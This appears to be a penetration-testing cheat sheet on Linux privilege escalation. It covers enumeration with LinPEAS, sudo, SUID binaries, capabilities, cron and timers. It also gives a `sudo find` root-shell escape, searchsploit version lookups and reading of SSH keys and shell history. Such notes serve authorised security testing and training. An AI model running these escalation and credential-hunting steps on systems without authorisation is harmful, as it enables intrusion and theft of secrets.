---
title: Linux privilege escalation
order: 1
tags: [linux, privesc, sudo, suid, capabilities, linpeas]
---

## Situational awareness

```bash
id
uname -a
ss -lntup
```

Record user/groups, kernel and listening services. Process details depend on permissions. [id](https://www.gnu.org/software/coreutils/manual/html_node/id-invocation.html), [uname](https://www.gnu.org/software/coreutils/manual/html_node/uname-invocation.html), [ss](https://man7.org/linux/man-pages/man8/ss.8.html).

## Automated enumeration

Use a prepared LinPEAS release appropriate for the target; [transfer and verify](shells/file-transfers#verify-a-transferred-file) first.

```bash
./linpeas.sh -a > linpeas.txt
```

Review findings manually. A highlighted path is not a confirmed escalation. [LinPEAS options](https://github.com/peass-ng/PEASS-ng/blob/master/linPEAS/README.md).

## Sudo permissions

```bash
sudo -l
```

Record the run-as user, exact executable, allowed arguments and restrictions. [sudo manual](https://www.sudo.ws/docs/man/sudo.man/).

## Sudo find shell

Only when the sudo rule permits find as root with the required execution arguments:

```bash
sudo find . -exec /bin/sh \; -quit
```

Verify the resulting identity. Restricted arguments or execution policies may prevent this. [GTFOBins find](https://gtfobins.org/gtfobins/find/).

## SUID binaries

```bash
find / -type f -perm -4000 2>/dev/null
```

Check owner and the exact binary behavior before choosing a path. [GNU find permissions](https://www.gnu.org/software/findutils/manual/html_mono/find.html).

## File capabilities

```bash
getcap -r / 2>/dev/null
```

Record the capability and executable; a capability listing alone is not a working exploit. [getcap manual](https://man7.org/linux/man-pages/man8/getcap.8.html).

## Cron jobs

```bash
cat /etc/crontab /etc/cron.d/* /var/spool/cron/* 2>/dev/null
```

Some files are unreadable. Check job user, script and dependency permissions, plus the trigger, before changes. [crontab format](https://man7.org/linux/man-pages/man5/crontab.5.html).

## Systemd timers

On systems using systemd:

```bash
systemctl list-timers --all
```

Inspect the associated service and its execution context. [systemctl manual](https://man7.org/linux/man-pages/man1/systemctl.1.html).

## Version-based exploits

Record the kernel (`uname -a`) and SUID binary versions, then search local exploit archives:

```bash
searchsploit linux kernel 5.15
searchsploit screen 4.5.0
```

Match the exact target version and compile on a matching libc where possible. A listed version alone is not a working exploit. [Exploit-DB searchsploit](https://www.exploit-db.com/searchsploit).

## Credential files

Look for reusable secrets in user files:

```bash
ls -la /home/*/.ssh/ 2>/dev/null
cat ~/.bash_history
```

A readable private key is a lead. Confirm its passphrase, intended account,
authorized server and logon policy before claiming SSH access. Check
[Linux application credentials](linux/credential-hunting) on dual-role hosts.
[OpenSSH key authentication](https://man.openbsd.org/ssh).
